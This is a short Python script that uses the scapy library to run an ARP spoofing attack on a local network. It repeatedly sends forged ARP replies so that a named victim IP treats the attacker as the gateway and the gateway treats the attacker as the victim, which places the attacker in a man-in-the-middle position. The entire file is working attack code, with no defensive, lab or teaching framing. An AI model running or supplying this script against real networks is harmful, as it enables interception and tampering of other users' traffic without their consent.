from scapy.all import  send
import time
from scapy.layers.l2 import ARP

victim_ip = "192.168.8.20"
gateway_ip = "192.168.8.1"
attacker_mac = "AA:BB:CC:DD:EE:FF"  # Attacker's MAC (auto-detected usually)

def spoof(target_ip, spoof_ip):
    # op=2 means ARP Reply
    packet = ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=spoof_ip)
    send(packet, verbose=False)

print("[*] Starting ARP spoofing... Press Ctrl+C to stop.")
try:
    while True:
        # Tell victim "I am the router"
        spoof(victim_ip, gateway_ip)
        # Tell router "I am the victim"
        spoof(gateway_ip, victim_ip)
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[!] Stopped ARP spoofing.")
